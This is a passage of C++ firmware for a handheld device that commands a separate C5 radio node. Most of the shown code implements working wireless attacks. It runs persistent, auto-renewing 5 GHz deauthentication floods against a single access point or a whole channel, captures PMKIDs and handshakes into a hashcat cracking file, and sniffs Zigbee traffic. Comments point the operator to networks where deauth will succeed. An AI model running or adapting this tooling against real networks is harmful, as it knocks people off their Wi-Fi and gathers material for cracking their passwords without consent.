/*
 * c5_scan — drive a C5 node to do a dual-band WiFi scan and display
 * the results. Also shows the C5 connection status indicator.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "c5_cmd.h"
#include "../hs_format.h"
#include "ble_db.h"
#include "sd_helper.h"
#include "../wifi_types.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>

extern void wifi_show_ap_details(const ap_t &a);
extern ap_t g_last_selected_ap;
extern bool g_last_selected_valid;
#include "sfx.h"

/* Identity-based flush dedup for the C5 result rings. c5_pmkids()/c5_hss()
 * copy from FIFO stores that evict oldest-first once full (see MAX_PMKIDS in
 * c5_cmd.cpp). An absolute "written" index into that shifting window either
 * stops flushing new captures once the ring is full, or re-emits entries that
 * slid to a lower index. Track what's been saved by a 16-byte identity key
 * instead. Cap at 64 distinct keys per session — well past a single target's
 * realistic yield; if exceeded the worst case is a harmless duplicate line in
 * hashcat's output, which it dedups on load. */
struct c5_saved_set { uint8_t keys[64][16]; int n; };

/* Returns true if `key` was not present (caller should persist it). */
static bool c5_saved_add(c5_saved_set &s, const uint8_t key[16]) {
    for (int i = 0; i < s.n; ++i)
        if (memcmp(s.keys[i], key, 16) == 0) return false;
    if (s.n < 64) memcpy(s.keys[s.n++], key, 16);
    return true;
}

/* The C5 pauses its HELLO beacons while mid scan/attack, so right after a
 * deauth its last-seen goes stale and a one-shot online check false-negatives
 * ("no C5 online" when it's right there — hitting Status re-pings and recovers
 * it). This pings the node and waits for a fresh reply for a few seconds before
 * declaring it gone, so every feature self-recovers without the Status dance. */
static bool c5_present(void)
{
    if (c5_any_online()) return true;
    /* The ping/reply round-trip can take up to ~6 s. Show the shared scanning
     * indicator so the screen never looks frozen during the wait, and let ESC
     * bail out early instead of dead-waiting the whole window. */
    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2);  d.print("C5 SATELLITE");
    d.drawFastHLine(4, BODY_Y + 12, 96, T_ACCENT);
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 28);  d.print("waking the node over ESP-NOW");
    ui_draw_footer("`=cancel");
    uint32_t deadline = millis() + 6000;
    uint32_t last_ping = 0;
    while (millis() < deadline) {
        if (millis() - last_ping > 800) { c5_cmd_ping(); last_ping = millis(); }
        ui_scanning_indicator("reaching", -1);
        if (c5_any_online()) return true;
        if (input_poll() == PK_ESC) return false;
        delay(80);
    }
    return false;
}

/* Live C5 deauth dashboard — identical UX to feat_wifi_deauth, but
 * frames stat comes from c5_status_frames() (RESP_STATUS stream from
 * the satellite) and TX is routed via ESP-NOW. Auto-renews the C5
 * deauth command every ~50 s so the attack persists until ESC. */
void c5_deauth_dashboard(const ap_t &a, bool broadcast)
{
    radio_switch(RADIO_WIFI);
    if (!c5_present()) { ui_toast("no C5 online", T_BAD, 1200); return; }

    auto &d = M5Cardputer.Display;
    const uint16_t BURST_MS = 60000;   /* long bursts; re-armed in loop */
    uint8_t target[6];
    if (broadcast) memset(target, 0xFF, 6);
    else           memcpy(target, a.bssid, 6);

    /* Fire the first burst. */
    c5_cmd_deauth(target, a.channel, broadcast ? 1 : 0, BURST_MS);
    sfx_deauth_burst();

    ui_clear_body();
    ui_draw_footer("ESC=stop  SPACE=pause");
    bool paused = false;
    bool state_changed = true;
    uint32_t last_redraw  = 0;
    uint32_t last_burst   = millis();
    uint32_t prev_frames  = c5_status_frames();
    uint32_t prev_sample  = millis();
    uint32_t rate_per_sec = 0;

    while (true) {
        uint32_t now = millis();

        /* Re-arm the C5 attack before the previous burst expires. */
        if (!paused && now - last_burst > (BURST_MS - 4000)) {
            c5_cmd_deauth(target, a.channel, broadcast ? 1 : 0, BURST_MS);
            last_burst = now;
        }

        if (now - last_redraw > 250) {
            last_redraw = now;
            ui_dashboard_chrome(broadcast ? ">> 5G NUKE-CH <<" : ">> 5G DEAUTH <<",
                                state_changed);
            state_changed = false;
            /* Wipe only the status text region; chrome animates underneath. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);

            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 16);
            if (broadcast) {
                d.printf("ALL on ch%u", a.channel);
            } else {
                d.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                         a.bssid[0], a.bssid[1], a.bssid[2],
                         a.bssid[3], a.bssid[4], a.bssid[5]);
            }
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 26); d.printf("channel %u  [5G via C5]", a.channel);

            /* Frame rate calc — uses the C5's reported total. RESP_STATUS
             * arrives in spurts when the C5's TX queue is hot, so smooth
             * over a 1 s window. */
            uint32_t cur_frames = c5_status_frames();
            if (now - prev_sample >= 1000) {
                rate_per_sec = (cur_frames - prev_frames);
                prev_frames  = cur_frames;
                prev_sample  = now;
            }

            d.setTextColor(paused ? T_WARN : T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 40);
            d.printf("frames: %lu", (unsigned long)cur_frames);
            d.setCursor(4, BODY_Y + 50);
            d.printf("rate  : %lu/s%s", (unsigned long)rate_per_sec,
                     paused ? " (PAUSED)" : "");

            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 60);
            d.printf("via   : C5 satellite");

            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
            ui_draw_status(radio_name(), paused ? "paused" : "C5-DAUTH");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { c5_cmd_stop(); break; }
        if (k == PK_SPACE) {
            paused = !paused;
            state_changed = true;
            if (paused) c5_cmd_stop();
            else {
                c5_cmd_deauth(target, a.channel, broadcast ? 1 : 0, BURST_MS);
                last_burst = millis();
            }
        }
    }
}

/* Short 4-char auth string for list rendering. Matches ESP-IDF's
 * wifi_auth_mode_t enum ordering. PMF-implying modes (WPA3, W23, W3X)
 * mean deauth frames will be ignored by the client — visible cue that
 * the attack won't land. */
static const char *auth_short(uint8_t a)
{
    switch (a) {
    case 0:  return "OPN ";   /* WIFI_AUTH_OPEN */
    case 1:  return "WEP ";
    case 2:  return "WPA ";
    case 3:  return "WPA2";
    case 4:  return "W12 ";   /* WPA/WPA2 mixed */
    case 5:  return "EAP ";
    case 6:  return "WPA3";   /* PMF mandatory */
    case 7:  return "W23 ";   /* WPA2/WPA3 mixed, PMF optional */
    case 8:  return "WAPI";
    case 9:  return "OWE ";
    case 10: return "EAP3";
    case 11: return "W3X ";
    case 12: return "W3M ";
    default: return "??  ";
    }
}

static void draw_status_header(void)
{
    /* Called from every C5 feature's render tick (300–500 ms). Without
     * this cache the status dot + peer count text repaints every frame
     * even when the peer count hasn't changed — visible as a flash on
     * every live screen. Invalidate by passing -1 / resetting last_n
     * when transitioning to a new C5 screen. */
    static int     last_n = -1;
    static uint16_t last_col = 0;
    auto &d = M5Cardputer.Display;
    int n = c5_peer_count();
    uint16_t col = n > 0 ? T_GOOD : T_BAD;
    if (n == last_n && col == last_col) return;
    last_n = n; last_col = col;

    d.fillCircle(SCR_W - 10, 6, 3, col);  /* status dot */
    d.setTextColor(col, 0x0841);
    /* Clear the text band first so old digits don't shadow through. */
    d.fillRect(SCR_W - 60, 2, 45, 8, 0x0841);
    d.setCursor(SCR_W - 60, 2);
    if (n == 0) d.print("no C5");
    else        d.printf("C5 x%d", n);
}

void feat_c5_status(void)
{
    Serial.println("[c5_status] enter");
    radio_switch(RADIO_WIFI);
    Serial.println("[c5_status] radio_switch OK");
    c5_begin();
    Serial.println("[c5_status] c5_begin OK");

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    ui_status_invalidate();
    ui_draw_footer("P=ping  S=stop  `=back");

    uint32_t last = 0;
    uint32_t frame = 0;
    int last_n = -2;
    uint32_t last_age_s = 0xFFFFFFFFu;
    while (true) {
        if (millis() - last > 400) {
            last = millis();
            ++frame;

            /* Snapshot once. No further live reads during this frame. */
            int n = c5_peer_count();
            if (n > 6) n = 6;
            char names[6][16];
            for (int i = 0; i < n; ++i) c5_peer_name_copy(i, names[i], sizeof(names[i]));
            uint32_t age_ms = (n > 0) ? c5_last_seen_ms() : 0;

            if ((frame & 7) == 0) Serial.printf("[c5_status] frame=%lu n=%d\n",
                                                (unsigned long)frame, n);

            if (n != last_n) {
                last_n = n;
                last_age_s = 0xFFFFFFFFu;
                ui_clear_body();
                d.setTextColor(0xF81F, T_BG);
                d.setCursor(4, BODY_Y + 2); d.print("C5 NODES");
                d.drawFastHLine(4, BODY_Y + 12, 80, 0xF81F);
                if (n == 0) {
                    d.setTextColor(T_BAD, T_BG);
                    d.setCursor(4, BODY_Y + 24); d.print("NO C5 ONLINE");
                    d.setTextColor(T_DIM, T_BG);
                    d.setCursor(4, BODY_Y + 38); d.print("power on your C5 node.");
                    d.setCursor(4, BODY_Y + 48); d.print("it broadcasts HELLO every 5s.");
                    d.setCursor(4, BODY_Y + 58); d.print("will auto-connect.");
                } else {
                    d.setTextColor(T_GOOD, T_BG);
                    d.setCursor(4, BODY_Y + 22);
                    d.printf("ONLINE  %d peer%s", n, n == 1 ? "" : "s");
                    for (int i = 0; i < n; ++i) {
                        d.setTextColor(T_FG, T_BG);
                        d.setCursor(8, BODY_Y + 36 + i * 10);
                        d.printf("* %s", names[i]);
                    }
                }
            }
            if (n > 0) {
                uint32_t age_s = age_ms / 1000;
                if (age_s != last_age_s) {
                    last_age_s = age_s;
                    ui_text_w(4, BODY_Y + BODY_H - 10, 160, T_DIM,
                              "last seen: %lus ago", (unsigned long)age_s);
                }
            }
            draw_status_header();
            d.fillRect(SCR_W - 30, BODY_Y + BODY_H - 24, 24, 22, T_BG);
            ui_radar(SCR_W - 20, BODY_Y + BODY_H - 14, 8, T_ACCENT);
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(40); continue; }
        if (k == PK_ESC) break;
        if (k == 'p' || k == 'P') { c5_cmd_ping(); ui_toast("ping sent", T_ACCENT, 400); last_n = -2; }
        if (k == 's' || k == 'S') { c5_cmd_stop(); ui_toast("stop sent", T_WARN, 400); last_n = -2; }
    }
    Serial.println("[c5_status] exit");
}

void feat_c5_scan_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();

    if (!c5_any_online()) {
        ui_toast("no C5 online", T_BAD, 1500);
        return;
    }
    c5_clear_results();
    c5_cmd_scan_5g(300);

    auto &d = M5Cardputer.Display;
    ui_clear_body();  /* one-time entry clear */
    ui_draw_footer(";/. move  ENTER=info  R=rescan  `=back");
    int cursor = 0;
    int last_n = -1;
    int last_cursor = -1;
    uint32_t last = 0;
    while (true) {
        /* Animate EVERY iteration while waiting on the C5 — the gated redraw
         * below only fires on a data/cursor change, so without this the scan
         * reads as frozen until the first AP lands. ui_radar self-advances via
         * millis() and self-manages its afterglow. */
        if (c5_aps(nullptr, 0) == 0)
            ui_radar(SCR_W / 2, BODY_Y + 62, 24, 0x07FF);
        if (millis() - last > 300) {
            last = millis();
            int n_now = c5_aps(nullptr, 0);
            bool new_result = (n_now != last_n);
            if (new_result || cursor != last_cursor) {
            last_n = n_now;
            last_cursor = cursor;
            char title[40];
            snprintf(title, sizeof(title), "DUAL-BAND %d (raw %lu/%lu)",
                     n_now,
                     (unsigned long)c5_dbg_raw_ap_records(),
                     (unsigned long)c5_dbg_resp_ap_frames());
            ui_dashboard_chrome(title, new_result);
            /* Wipe only the AP-list region so the rows redraw clean
             * without flashing the whole body. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            draw_status_header();
            ui_freq_bars(SCR_W - 58, BODY_Y + 2, 3, 10);

            c5_ap_t aps[64];
            int n = c5_aps(aps, 64);
            /* Sort by RSSI descending (bubble — n is small). */
            for (int i = 1; i < n; ++i) {
                for (int j = 0; j < n - i; ++j) {
                    if (aps[j].rssi < aps[j + 1].rssi) {
                        c5_ap_t t = aps[j]; aps[j] = aps[j + 1]; aps[j + 1] = t;
                    }
                }
            }

            if (n == 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 24);
                d.print("waiting for C5 response...");
                ui_radar(SCR_W / 2, BODY_Y + 60, 25, 0x07FF);
            } else {
                int rows = 7;
                if (cursor < 0) cursor = 0;
                if (cursor >= n) cursor = n - 1;
                last_cursor = cursor;
                int first = cursor - rows / 2;
                if (first < 0) first = 0;
                if (first + rows > n) first = max(0, n - rows);
                for (int r = 0; r < rows && first + r < n; ++r) {
                    int i = first + r;
                    const c5_ap_t &a = aps[i];
                    int y = BODY_Y + 18 + r * 12;
                    bool sel = (i == cursor);
                    if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
                    uint16_t rowbg = sel ? 0x3007 : T_BG;
                    /* Band badge. */
                    d.setTextColor(a.is_5g ? 0xF81F : T_ACCENT, rowbg);
                    d.setCursor(2, y);
                    d.print(a.is_5g ? "5G" : "2G");
                    /* RSSI */
                    d.setTextColor(sel ? 0xFFFF : T_FG, rowbg);
                    d.setCursor(20, y);
                    d.printf("%4d", a.rssi);
                    /* Auth — highlight PMF-implying modes in red so
                     * the operator sees at a glance deauth won't work. */
                    bool pmf = (a.auth == 6 || a.auth == 10 || a.auth == 11);
                    d.setTextColor(pmf ? T_BAD : T_WARN, rowbg);
                    d.setCursor(48, y);
                    d.print(auth_short(a.auth));
                    /* Channel */
                    d.setTextColor(T_DIM, rowbg);
                    d.setCursor(78, y);
                    d.printf("%u", a.channel);
                    /* SSID */
                    d.setTextColor(sel ? T_ACCENT : T_FG, rowbg);
                    d.setCursor(100, y);
                    d.printf("%.22s", a.ssid[0] ? a.ssid : "<hidden>");
                }
            }
            }
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(40); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { cursor++; }
        if (k == 'r' || k == 'R') { c5_clear_results(); c5_cmd_scan_5g(300); last_n = -1; }
        if (k == PK_ENTER) {
            /* Pull the current snapshot, sort RSSI-desc to match what's
             * displayed, then convert the cursor row to an ap_t and hand
             * off to the shared detail view (same hotkeys as 2.4 GHz
             * scan; D will route to C5 deauth automatically because
             * is_5g=true). */
            c5_ap_t snap[64];
            int n = c5_aps(snap, 64);
            for (int i = 1; i < n; ++i) {
                for (int j = 0; j < n - i; ++j) {
                    if (snap[j].rssi < snap[j + 1].rssi) {
                        c5_ap_t t = snap[j]; snap[j] = snap[j + 1]; snap[j + 1] = t;
                    }
                }
            }
            if (n > 0 && cursor < n) {
                const c5_ap_t &c = snap[cursor];
                ap_t a = {};
                strncpy(a.ssid, c.ssid, sizeof(a.ssid) - 1);
                a.ssid[sizeof(a.ssid) - 1] = '\0';
                memcpy(a.bssid, c.bssid, 6);
                a.rssi    = c.rssi;
                a.channel = c.channel;
                a.auth    = c.auth;
                a.is_5g   = c.is_5g;
                g_last_selected_ap    = a;
                g_last_selected_valid = true;
                wifi_show_ap_details(a);
                /* Force list redraw after detail screen returns. */
                last_n = -1;
                ui_draw_footer(";/. move  ENTER=info  R=rescan  `=back");
            }
        }
    }
}

/* ==================== C5 5 GHz Deauth ==================== */

/* Trigger a C5 dual-band sweep and poll until 5 GHz APs stream in. The C5
 * scan blocks ~7-10 s then streams result batches over the following seconds,
 * so a one-shot read (the old delay+read) almost always saw zero. Reuses
 * cached 5 GHz results if present. Fills `out` with the 5 GHz subset, returns
 * the count. Shows a radar while waiting; ESC aborts the wait. */
static int c5_collect_5g(c5_ap_t *out, int max)
{
    auto &d = M5Cardputer.Display;
    c5_ap_t all[64];
    int n = c5_aps(all, 64);
    int f = 0;
    for (int i = 0; i < n && f < max; ++i) if (all[i].is_5g) out[f++] = all[i];
    if (f > 0) return f;

    c5_clear_results();
    c5_cmd_scan_5g(300);
    ui_clear_body();
    d.setTextColor(T_ACCENT2, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("SCANNING 5 GHz...");
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
    ui_draw_footer("`=abort");
    /* The C5 does a ~300ms/channel dual-band active scan across ~40 channels,
     * so it blocks ~10 s then streams the result batch. The old 12 s window
     * timed out right as 5 GHz arrived -> "no 5 GHz APs" in Nuke/PMKID even
     * though the scan screen (which waits forever) saw them. Give it 20 s, but
     * return as soon as the 5 GHz count has held steady for 1.5 s (batch done)
     * so we don't burn the whole window when results land early. */
    uint32_t deadline = millis() + 20000;
    int last_f = -1;
    uint32_t stable_since = millis();
    while (millis() < deadline) {
        n = c5_aps(all, 64);
        f = 0;
        for (int i = 0; i < n && f < max; ++i) if (all[i].is_5g) out[f++] = all[i];
        if (f != last_f) { last_f = f; stable_since = millis(); }
        d.setTextColor(f ? T_GOOD : T_DIM, T_BG);
        d.setCursor(4, BODY_Y + 30); d.printf("5G APs: %-3d   total %-3d ", f, n);
        d.fillRect(SCR_W - 38, BODY_Y + 30, 32, 32, T_BG);
        ui_radar(SCR_W - 24, BODY_Y + 44, 14, T_ACCENT);
        if (f > 0 && millis() - stable_since > 1500) break;
        if (input_poll() == PK_ESC) break;
        delay(120);
    }
    return f;
}

void feat_c5_deauth_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_present()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    c5_ap_t aps[64];
    int n = c5_collect_5g(aps, 64);
    if (n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }

    /* Cursor select target. */
    int cursor = 0;
    auto &d = M5Cardputer.Display;
    ui_draw_footer(";/. pick  ENTER=fire  X=all on ch  `=back");
    bool picking = true;
    int chosen = -1;
    int last_drawn = -2;
    while (picking) {
        if (cursor < 0) cursor = 0;
        if (cursor >= n) cursor = n - 1;
        if (cursor != last_drawn) {
            last_drawn = cursor;
            ui_clear_body();
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("PICK 5 GHz TARGET");
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
            int rows = 7;
            int first = cursor - rows / 2;
            if (first < 0) first = 0;
            if (first + rows > n) first = (n > rows) ? (n - rows) : 0;
            for (int r = 0; r < rows && first + r < n; ++r) {
                int i = first + r;
                const c5_ap_t &a = aps[i];
                int y = BODY_Y + 18 + r * 12;
                bool sel = (i == cursor);
                if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
                d.setTextColor(sel ? T_ACCENT : T_FG, sel ? 0x3007 : T_BG);
                d.setCursor(2, y);
                d.printf("%4d ch%-3u %.20s", a.rssi, a.channel,
                         a.ssid[0] ? a.ssid : "<hidden>");
            }
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) return;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { cursor++; }
        if (k == PK_ENTER) { chosen = cursor; picking = false; break; }
        if (k == 'x' || k == 'X') {
            /* Deauth everyone on the selected target's channel. */
            uint8_t zero[6] = {0};
            uint8_t ch = aps[cursor].channel;
            c5_cmd_deauth(zero, ch, 1, 8000);
            picking = false;
            chosen = -2;  /* marker: bcast-all */
        }
    }

    /* Live attack dashboard. */
    uint16_t dur = 8000;
    uint8_t attack_ch = (chosen == -2) ? aps[cursor].channel : aps[chosen].channel;
    if (chosen >= 0) {
        c5_cmd_deauth(aps[chosen].bssid, aps[chosen].channel, 0, dur);
    }
    /* ESP32-S3 radio cannot tune to 5 GHz channels — esp_wifi_set_channel
     * returns ESP_ERR_WIFI_IF (258). We can't follow the C5 to its attack
     * channel. Instead, C5 hops to ch 1 briefly to send each RESP_STATUS
     * (see wifi_attacker.c:send_status), so POSEIDON on ch 1 receives
     * them normally. No channel switch here. */
    const char *mode = (chosen == -2) ? "5G NUKE-CH" : "5G DEAUTH";
    uint32_t end = millis() + dur + 1500;
    uint32_t last = 0;
    uint32_t last_frames = 0;
    ui_clear_body();  /* ONE-TIME wipe on entry — after this, only the
                         status region gets redrawn. No per-frame full
                         clear → no flashing. */
    ui_draw_footer("`=stop");
    while (millis() < end) {
        if (millis() - last > 200) {
            last = millis();
            uint32_t now_frames = c5_status_frames();
            bool tick = (now_frames != last_frames);
            last_frames = now_frames;
            ui_dashboard_chrome(mode, tick);
            /* Wipe ONLY the status text region so changing values don't
             * leave leftover glyphs behind. Hex stream above + below
             * animates smoothly underneath. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 16);
            if (chosen == -2) {
                d.printf("ALL on ch%u", c5_status_channel());
            } else {
                const c5_ap_t &a = aps[chosen];
                d.printf("%.22s", a.ssid[0] ? a.ssid : "<hidden>");
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 28);
                d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
                         a.channel,
                         a.bssid[0], a.bssid[1], a.bssid[2],
                         a.bssid[3], a.bssid[4], a.bssid[5]);
            }
            /* While C5 is hammering TX on the attack channel, its
             * RESP_STATUS packets get squeezed by the TX queue and
             * arrive in bursts, not smoothly. Show "LIVE" until we
             * actually receive a non-zero count so the operator doesn't
             * think nothing's happening. */
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 44);
            if (now_frames > 0)
                d.printf("frames: %lu", (unsigned long)now_frames);
            else
                d.print("ATTACK LIVE (count lags)");
            d.setCursor(4, BODY_Y + 56);
            uint32_t left = (end - millis()) / 1000;
            d.printf("time  : %lus", (unsigned long)left);
            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
            ui_draw_status(radio_name(), "C5-DAUTH");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { c5_cmd_stop(); break; }
    }
}

void feat_c5_scan_zb(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_present()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    c5_clear_results();
    c5_cmd_scan_zb(0xFF);  /* hop all channels 11-26 */

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    ui_draw_footer("`=back");
    int last_n = -1;
    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            c5_zb_t probe[1];
            int n_now = c5_zbs(probe, 0);
            bool new_frame = (n_now != last_n);
            last_n = n_now;
            ui_dashboard_chrome("C5 ZIGBEE SNIFF", new_frame);
            /* Wipe only the frames/status zone — hex stream self-clears. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            draw_status_header();
            ui_freq_bars(SCR_W - 58, BODY_Y + 2, 3, 10);

            c5_zb_t z[32];
            int n = c5_zbs(z, 32);
            if (n == 0) {
                /* Live "still alive" indicator — we have no frames but
                 * the C5 IS hopping. Show simulated channel hop and a
                 * pulse so silence reads as "no traffic" not "broken". */
                uint8_t hop_ch = 11 + ((millis() / 500) % 16);  /* 11..26 */
                d.setTextColor(T_ACCENT, T_BG);
                d.setCursor(4, BODY_Y + 24);
                d.printf("hopping ch%u", hop_ch);
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 38);
                d.print("listening on 802.15.4...");
                d.setCursor(4, BODY_Y + 52);
                d.print("(zigbee/thread/matter — silent");
                d.setCursor(4, BODY_Y + 62);
                d.print(" until a device transmits)");
                /* Hop progress bar — fills 0->15 over the channel range. */
                int bar = ((hop_ch - 11) * (SCR_W - 30)) / 15;
                d.fillRect(4, BODY_Y + BODY_H - 18, bar, 3, T_ACCENT);
                d.drawRect(4, BODY_Y + BODY_H - 18, SCR_W - 30, 3, T_DIM);
                /* Pulse dot moving with hop. */
                int px = 4 + bar;
                d.fillCircle(px, BODY_Y + BODY_H - 17, 2, T_ACCENT2);
            } else {
                int rows = 7;
                int first = n > rows ? n - rows : 0;
                for (int r = 0; r < rows && first + r < n; ++r) {
                    const c5_zb_t &e = z[first + r];
                    int y = BODY_Y + 18 + r * 12;
                    d.setTextColor(T_ACCENT, T_BG);
                    d.setCursor(2, y);  d.printf("ch%u", e.channel);
                    d.setTextColor(T_FG, T_BG);
                    d.setCursor(32, y); d.printf("%4d", e.rssi);
                    d.setTextColor(T_WARN, T_BG);
                    d.setCursor(64, y);
                    switch (e.frame_type) {
                    case 0: d.print("BCN "); break;
                    case 1: d.print("DATA"); break;
                    case 2: d.print("ACK "); break;
                    case 3: d.print("CMD "); break;
                    default: d.printf("t%d", e.frame_type);
                    }
                    d.setTextColor(T_FG, T_BG);
                    d.setCursor(102, y);
                    d.printf("PAN%04X src%04X", e.pan_id, e.src_short);
                }
            }
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(40); continue; }
        if (k == PK_ESC) break;
    }
    c5_cmd_stop();
}

/* ==================== C5 5 GHz PMKID capture ==================== */

/* ESSID for a captured handshake's BSSID, pulled from the C5 scan cache so the
 * hashcat line carries the network name (the C5 no longer sends it on wire). */
static const char *c5_ssid_for_bssid(const uint8_t bssid[6])
{
    static char ssid[33];
    c5_ap_t aps[64];
    int n = c5_aps(aps, 64);
    for (int i = 0; i < n; ++i) {
        if (memcmp(aps[i].bssid, bssid, 6) == 0) {
            strncpy(ssid, aps[i].ssid, sizeof(ssid) - 1);
            ssid[sizeof(ssid) - 1] = '\0';
            return ssid;
        }
    }
    ssid[0] = '\0';
    return ssid;
}

static void save_hs_to_sd(const c5_hs_t &h, const char *essid)
{
    if (!sd_mount()) return;
    SD.mkdir("/poseidon");
    File f = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!f) return;
    char line[512];
    int n = hs_format_22000(line, sizeof(line), h.bssid, h.sta, h.anonce,
                            h.eapol_m2, h.eapol_m2_len,
                            essid ? essid : "");
    if (n > 0) f.println(line);
    f.close();
}

static void save_pmkid_to_sd(const c5_pmkid_t &p)
{
    if (!sd_mount()) return;
    SD.mkdir("/poseidon");
    File f = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!f) return;
    /* hashcat 22000 WPA*01* format:
     *   WPA*01*<pmkid>*<bssid>*<sta>*<essid_hex>***  */
    f.print("WPA*01*");
    for (int i = 0; i < 16; ++i) f.printf("%02x", p.pmkid[i]);
    f.print("*");
    for (int i = 0; i < 6;  ++i) f.printf("%02x", p.bssid[i]);
    f.print("*");
    for (int i = 0; i < 6;  ++i) f.printf("%02x", p.sta[i]);
    f.print("*");
    if (p.ssid_len > 0) {
        for (int i = 0; i < p.ssid_len && i < 33; ++i) f.printf("%02x", (uint8_t)p.ssid[i]);
    }
    f.println("***");
    f.close();
    Serial.printf("[c5_pmkid] logged PMKID %02x%02x%02x%02x... sta %02X:%02X:%02X\n",
                  p.pmkid[0], p.pmkid[1], p.pmkid[2], p.pmkid[3],
                  p.sta[3], p.sta[4], p.sta[5]);
}

void feat_c5_pmkid_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_present()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    /* Reuse cached 5 GHz results, or sweep + poll until they stream in. */
    c5_ap_t aps[64];
    int n = c5_collect_5g(aps, 64);
    if (n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }

    /* Target picker. */
    auto &d = M5Cardputer.Display;
    int cursor = 0;
    ui_draw_footer(";/. pick  ENTER=capture  `=back");
    int chosen = -1;
    int last_drawn = -2;
    while (chosen < 0) {
        if (cursor < 0) cursor = 0;
        if (cursor >= n) cursor = n - 1;
        if (cursor != last_drawn) {
            last_drawn = cursor;
            ui_clear_body();
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("PMKID 5 GHz — PICK TARGET");
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
            int rows = 7;
            int first = cursor - rows / 2;
            if (first < 0) first = 0;
            if (first + rows > n) first = (n > rows) ? (n - rows) : 0;
            for (int r = 0; r < rows && first + r < n; ++r) {
                int i = first + r;
                const c5_ap_t &a = aps[i];
                int y = BODY_Y + 18 + r * 12;
                bool sel = (i == cursor);
                if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
                d.setTextColor(sel ? T_ACCENT : T_FG, sel ? 0x3007 : T_BG);
                d.setCursor(2, y);
                d.printf("%4d ch%-3u %.20s", a.rssi, a.channel,
                         a.ssid[0] ? a.ssid : "<hidden>");
            }
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) return;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { cursor++; }
        if (k == PK_ENTER) { chosen = cursor; break; }
    }

    /* Fire capture + live dashboard. */
    c5_clear_results();
    uint16_t dur = 15000;
    c5_cmd_pmkid(aps[chosen].bssid, aps[chosen].channel, dur);

    uint32_t end = millis() + dur + 2000;
    uint32_t last = 0;
    int last_count = -1;
    c5_saved_set saved = {};   /* PMKIDs already written to SD, keyed by pmkid[] */
    ui_clear_body();
    ui_draw_footer("`=stop early");
    while (millis() < end) {
        if (millis() - last > 250) {
            last = millis();
            c5_pmkid_t buf[16];
            int got = c5_pmkids(buf, 16);
            bool tick = (got != last_count);
            last_count = got;

            /* Flush any capture not yet persisted (identity-keyed: the ring
             * evicts oldest-first, so an index would miss shifted entries). */
            for (int i = 0; i < got; ++i)
                if (c5_saved_add(saved, buf[i].pmkid)) save_pmkid_to_sd(buf[i]);

            ui_dashboard_chrome("C5 PMKID 5G", tick);
            /* Wipe only the status region — hex stream self-clears. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
